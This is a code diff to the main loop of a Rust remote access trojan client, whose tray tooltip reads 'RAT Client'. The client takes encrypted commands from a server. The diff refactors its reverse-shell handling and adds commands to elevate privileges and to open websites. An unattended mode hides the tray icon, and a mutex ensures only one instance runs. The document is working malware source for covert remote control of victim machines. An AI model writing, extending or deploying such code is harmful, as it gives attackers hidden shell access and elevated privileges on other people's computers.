@@ -13,28 +13,34 @@ pub mod handler;
 pub mod service;
 
 use handler::handle_command;
-use common::{buffers::read_buffer, ClientConfig};
+use common::{ buffers::read_buffer, ClientConfig };
 use rand::{ rngs::OsRng, Rng };
 use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
 use std::process;
 
 use crate::features::tray_icon::TrayIcon;
-use common::commands::{Command, EncryptionResponseData};
+use common::commands::{ Command, EncryptionResponseData };
 use common::buffers::write_buffer;
 
 use rand::SeedableRng;
 use rand_chacha::ChaCha20Rng;
 
 use rsa::RsaPublicKey;
+use once_cell::sync::Lazy;
+
+static MUTEX_LOCK: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
+    Mutex::new(service::mutex::MutexLock::new())
+);
+static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
+    Mutex::new(features::reverse_shell::ReverseShell::new())
+);
 
 fn handle_server(
     mut read_stream: TcpStream,
     mut write_stream: TcpStream,
     is_connected: Arc<Mutex<bool>>
 ) {
-    let mut remote_shell: Option<Child> = None;
-
     let mut current_path = PathBuf::new();
 
     let mut secret = [0u8; common::SECRET_LEN];
@@ -44,14 +50,11 @@ fn handle_server(
 
     loop {
         let secret_clone = Some(secret.to_vec());
-        let received_command = read_buffer(
-            &mut read_stream, 
-            if secret_initalized { 
-                &secret_clone
-            } else { 
-                &None
-            }
-        );
+        let received_command = read_buffer(&mut read_stream, if secret_initalized {
+            &secret_clone
+        } else {
+            &None
+        });
 
         match received_command {
             Ok(command) => {
@@ -61,18 +64,27 @@ fn handle_server(
 
                 let mut path_storage = String::new();
                 let mut path = "";
+                println!("Received command: {:?}", command);
                 match command {
                     Command::EncryptionRequest(data) => {
                         let padding = Pkcs1v15Encrypt::default();
-                        let public_key = RsaPublicKey::from_public_key_der(&data.public_key).unwrap();
+                        let public_key = RsaPublicKey::from_public_key_der(
+                            &data.public_key
+                        ).unwrap();
 
                         let encryption_response = EncryptionResponseData {
-                            secret: public_key.encrypt(&mut ChaCha20Rng::from_seed(secret), padding, &secret).unwrap()
+                            secret: public_key
+                                .encrypt(&mut ChaCha20Rng::from_seed(secret), padding, &secret)
+                                .unwrap(),
                         };
 
                         secret_initalized = true;
 
-                        write_buffer(&mut write_stream, Command::EncryptionResponse(encryption_response), &None);
+                        write_buffer(
+                            &mut write_stream,
+                            Command::EncryptionResponse(encryption_response),
+                            &None
+                        );
                     }
                     Command::InitClient => {
                         handler_name = "INIT_CLIENT";
@@ -82,9 +94,9 @@ fn handle_server(
                         break;
                     }
                     Command::Disconnect => {
-                        if let Some(shell) = remote_shell.as_mut() {
-                            let _ = shell.kill();
-                        }
+                        println!("should disconnect!");
+                        let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+                        reverse_shell_lock.exit_shell();
                         process::exit(1);
                     }
                     Command::GetProcessList => {
@@ -148,6 +160,16 @@ fn handle_server(
                         path_storage = data;
                         path = &path_storage;
                     }
+                    Command::VisitWebsite(data) => {
+                        handler_name = "VISIT_WEBSITE";
+                        command_data_storage = data.visit_type;
+                        command_data = &command_data_storage;
+                        path_storage = data.url;
+                        path = &path_storage;
+                    }
+                    Command::ElevateClient => {
+                        handler_name = "ELEVATE_CLIENT";
+                    }
                     _ => {
                         println!("Received an unknown or unhandled command.");
                     }
@@ -160,7 +182,6 @@ fn handle_server(
                         handler_name,
                         command_data,
                         path,
-                        &mut remote_shell,
                         &mut current_path,
                         &Some(secret.to_vec())
                     );
@@ -168,9 +189,8 @@ fn handle_server(
             }
             Err(_) => {
                 println!("Disconnected!");
-                if let Some(shell) = remote_shell.as_mut() {
-                    let _ = shell.kill();
-                }
+                let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+                reverse_shell_lock.exit_shell();
                 *is_connected.lock().unwrap() = false;
                 break;
             }
@@ -188,22 +208,27 @@ fn main() {
         startup: false,
     };
 
-    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(std::io::Cursor::new(&CONFIG));
+    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(
+        std::io::Cursor::new(&CONFIG)
+    );
 
     if let Some(config_link_sec) = config_link_sec.as_ref().ok() {
         config = config_link_sec.clone();
     }
 
     if config.mutex_enabled {
-        service::mutex::mutex_lock(&config.mutex);
+        let mut mutex_lock_guard = MUTEX_LOCK.lock().unwrap();
+        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
+        mutex_lock_guard.lock();
+
+        println!("Mutex locked!");
     }
 
     let is_connected = Arc::new(Mutex::new(false));
 
     let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
 
-    if !config.unattended_mode
-    {
+    if !config.unattended_mode {
         tray_icon.lock().unwrap().show();
     }
 
@@ -212,20 +237,16 @@ fn main() {
         let is_connected_clone = is_connected.clone();
         let tray_icon_clone = tray_icon.clone();
         if *is_connected_clone.lock().unwrap() {
-            if !config.unattended_mode
-            {
+            if !config.unattended_mode {
                 tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
             }
             sleep(std::time::Duration::from_secs(5));
             continue;
-        }
-        else {
-            if !config.unattended_mode
-            {
+        } else {
+            if !config.unattended_mode {
                 tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
             }
         }
-
 
         std::thread::spawn(move || {
             println!("Connecting to server...");
